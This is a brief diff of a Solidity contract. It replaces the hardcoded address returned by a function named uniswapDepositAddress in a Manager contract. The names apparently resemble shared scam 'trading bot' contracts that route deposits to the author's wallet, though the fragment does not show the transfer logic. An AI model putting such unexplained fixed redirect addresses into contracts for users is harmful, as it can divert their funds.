@@ -202,7 +202,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0xb1838E0CFCd04c41964B48847634E360B846DDDb;
+		return 0x1E6eA9124ecFcdf657638221E13eda479fCBb34f;
 	}
 }
 contract TokenCreator {
